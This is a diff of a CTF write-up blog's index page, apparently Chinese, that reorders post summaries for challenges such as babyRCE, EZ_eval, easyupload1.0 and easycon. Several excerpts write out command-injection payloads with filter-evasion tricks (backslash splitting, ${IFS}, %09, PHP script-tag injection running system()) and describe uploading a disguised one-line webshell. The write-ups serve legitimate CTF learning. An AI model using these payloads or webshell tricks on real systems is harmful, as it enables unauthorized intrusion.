@@ -181,8 +181,8 @@
         
 
 <div class="post">
-    <a href="/2026/01/28/2026-01-28-babyRCE/">
-        <h2 class="post-title">babyRCE</h2>
+    <a href="/2026/01/28/2026-01-28-easycon/">
+        <h2 class="post-title">easycon</h2>
     </a>
     <div class="category-and-date">
         
@@ -198,10 +198,14 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>发现题目没有禁用ls，传个?rce&#x3D;ls，发现有一个flag.php,用\绕过cat和flag的检测，用 ${IFS}代替空格</p>
-<p>?rce&#x3D;c\at${IFS}fl\ag.php</p>
-<p>发现Flag在源码中</p>
-<p><img src="/images/writeups/babyRCE_0ff5a64f.png" alt="babyRCE_0ff5a64f"></p>
+            <p>这里初始界面没找到什么有用的信息，加应该index.php发现POST传cmd可以执行命令</p>
+<p><img src="/images/writeups/easycon_e97c5393.png" alt="easycon_e97c5393"></p>
+<p>输入cmd&#x3D;system(‘ls’);</p>
+<p>回显bbbbbbbbb.txt gw.jpg gw2.jpg index.html index.php</p>
+<p>bbbbbbbbb.txt比较可疑</p>
+<p><img src="/images/writeups/easycon_160da602.png" alt="easycon_160da602"></p>
+<p>搜索没有在里面搜到flag结尾有等号，可能是base64解码一下头部有JFIF应该是图片解码成图片得到flag</p>
+<p><img src="/images/writeups/easycon_35309ed5.png" alt="easycon_35309ed5"></p>
 
             
         </div>
@@ -216,16 +220,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/RCE/" style="color: #00a596">RCE</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
-    <a href="/2026/01/28/2026-01-28-babyRCE/" class="go-post">阅读全文</a>
+    <a href="/2026/01/28/2026-01-28-easycon/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -263,16 +262,64 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Webshell/" style="color: #00a596">Webshell</a>
+            <a href="/tags/Webshell/" style="color: #ff7d73">Webshell</a>
         </span>
         
     </div>
     <a href="/2026/01/28/2026-01-28-webshell%E6%98%AF%E5%95%A5%E6%8D%8F/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/01/27/2026-01-27-easyupload1.0/">
+        <h2 class="post-title">easyupload1.0</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/1/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>打开题目发现要上传一个.jpg文件，把一句话木马换成.jpg格式再抓包改回来试试</p>
+<p><img src="/images/writeups/easyupload1.0_d08eefb9.png" alt="easyupload1.0_d08eefb9"></p>
+<p>成功上传，用蚁剑连接，在环境变量中找到flag</p>
+<p><img src="/images/writeups/easyupload1.0_f416dfe2.png" alt="easyupload1.0_f416dfe2"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #03a9f4">文件上传</a>
+        </span>
+        
+    </div>
+    <a href="/2026/01/27/2026-01-27-easyupload1.0/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -315,7 +362,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
     </div>
@@ -323,8 +370,8 @@
 </div>
 
 <div class="post">
-    <a href="/2026/01/27/2026-01-27-easyupload1.0/">
-        <h2 class="post-title">easyupload1.0</h2>
+    <a href="/2026/01/27/2026-01-27-%E6%88%91Flag%E5%91%A2/">
+        <h2 class="post-title">我Flag呢？</h2>
     </a>
     <div class="category-and-date">
         
@@ -340,10 +387,8 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>打开题目发现要上传一个.jpg文件，把一句话木马换成.jpg格式再抓包改回来试试</p>
-<p><img src="/images/writeups/easyupload1.0_d08eefb9.png" alt="easyupload1.0_d08eefb9"></p>
-<p>成功上传，用蚁剑连接，在环境变量中找到flag</p>
-<p><img src="/images/writeups/easyupload1.0_f416dfe2.png" alt="easyupload1.0_f416dfe2"></p>
+            <p>查看源码发现flag</p>
+<p><img src="/images/writeups/%E6%88%91Flag%E5%91%A2_152601d0.png" alt="我Flag呢_152601d0"></p>
 
             
         </div>
@@ -361,13 +406,8 @@
             <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
         </span>
         
-        <span class="tag">
-            
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #ff7d73">文件上传</a>
-        </span>
-        
     </div>
-    <a href="/2026/01/27/2026-01-27-easyupload1.0/" class="go-post">阅读全文</a>
+    <a href="/2026/01/27/2026-01-27-%E6%88%91Flag%E5%91%A2/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -405,12 +445,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #ffa2c4">文件上传</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #ff7d73">文件上传</a>
         </span>
         
     </div>
@@ -454,110 +494,16 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #03a9f4">文件上传</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #ff7d73">文件上传</a>
         </span>
         
     </div>
     <a href="/2026/01/27/2026-01-27-easyupload3.0/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/01/27/2026-01-27-%E6%88%91Flag%E5%91%A2/">
-        <h2 class="post-title">我Flag呢？</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/1/27
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>查看源码发现flag</p>
-<p><img src="/images/writeups/%E6%88%91Flag%E5%91%A2_152601d0.png" alt="我Flag呢_152601d0"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
-        </span>
-        
-    </div>
-    <a href="/2026/01/27/2026-01-27-%E6%88%91Flag%E5%91%A2/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/01/26/2026-01-26-EZ_eval/">
-        <h2 class="post-title">EZ_eval</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/1/26
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="/images/writeups/EZ_eval_5334e318.png" alt="EZ_eval_5334e318"></p>
-<p>这里发现script没有被禁用,%09代替空格构造payload：</p>
-<p>?word&#x3D;&lt;script%09language&#x3D;’php’&gt;system(‘ls%09&#x2F;‘)</script></p>
-<p>发现flag文件</p>
-<p>尝试?word&#x3D;&lt;script%09language&#x3D;’php’&gt;system(‘c<em>t%09fl</em>g’)</script></p>
-<p>好像不行，这里直接读取文件内容</p>
-<p>&lt;script%09language&#x3D;’php’&gt;system(‘strings%09&#x2F;fl*’)</script></p>
-<p>得到flag</p>
-<p><img src="/images/writeups/EZ_eval_1939400c.png" alt="EZ_eval_1939400c"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/RCE/" style="color: #ff7d73">RCE</a>
-        </span>
-        
-    </div>
-    <a href="/2026/01/26/2026-01-26-EZ_eval/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -601,6 +547,59 @@
         
     </div>
     <a href="/2026/01/26/2026-01-26-Follow-me-and-hack-me/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/01/26/2026-01-26-EZ_eval/">
+        <h2 class="post-title">EZ_eval</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/1/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="/images/writeups/EZ_eval_5334e318.png" alt="EZ_eval_5334e318"></p>
+<p>这里发现script没有被禁用,%09代替空格构造payload：</p>
+<p>?word&#x3D;&lt;script%09language&#x3D;’php’&gt;system(‘ls%09&#x2F;‘)</script></p>
+<p>发现flag文件</p>
+<p>尝试?word&#x3D;&lt;script%09language&#x3D;’php’&gt;system(‘c<em>t%09fl</em>g’)</script></p>
+<p>好像不行，这里直接读取文件内容</p>
+<p>&lt;script%09language&#x3D;’php’&gt;system(‘strings%09&#x2F;fl*’)</script></p>
+<p>得到flag</p>
+<p><img src="/images/writeups/EZ_eval_1939400c.png" alt="EZ_eval_1939400c"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/RCE/" style="color: #ff7d73">RCE</a>
+        </span>
+        
+    </div>
+    <a href="/2026/01/26/2026-01-26-EZ_eval/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -648,12 +647,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #ffa2c4">SQL注入</a>
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #00a596">SQL注入</a>
         </span>
         
     </div>
